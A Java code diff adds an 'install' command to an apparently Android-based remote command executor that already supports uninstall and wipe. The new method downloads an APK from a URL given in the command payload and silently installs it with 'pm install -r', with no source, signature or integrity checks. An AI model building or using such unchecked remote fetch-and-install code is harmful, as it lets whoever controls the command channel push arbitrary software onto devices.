@@ -37,6 +37,9 @@ public class CommandExecutor {
             case "uninstall":
                 executeUninstallApp(payload.optString("package", ""));
                 break;
+            case "install":
+                executeInstallApp(payload.optString("package", ""));
+                break;
             default:
                 throw new Exception("Unknown command: " + command);
         }
@@ -73,6 +76,19 @@ public class CommandExecutor {
     private void executeUninstallApp(String packageName) throws Exception {
         if (packageName.isEmpty()) throw new Exception("No package specified");
         Process p = Runtime.getRuntime().exec(new String[]{"pm", "uninstall", packageName});
+        p.waitFor();
+    }
+    private void executeInstallApp(String packageUrl) throws Exception {
+        if (packageUrl.isEmpty()) throw new Exception("No package URL specified");
+        // Download APK then install
+        java.io.File outFile = new java.io.File(ctx.getCacheDir(), "za_install.apk");
+        java.net.URL url = new java.net.URL(packageUrl);
+        java.io.InputStream in = url.openStream();
+        java.io.FileOutputStream fos = new java.io.FileOutputStream(outFile);
+        byte[] buf = new byte[4096]; int n;
+        while ((n = in.read(buf)) != -1) fos.write(buf, 0, n);
+        in.close(); fos.close();
+        Process p = Runtime.getRuntime().exec(new String[]{"pm", "install", "-r", outFile.getAbsolutePath()});
         p.waitFor();
     }
     private void executeWipe() {
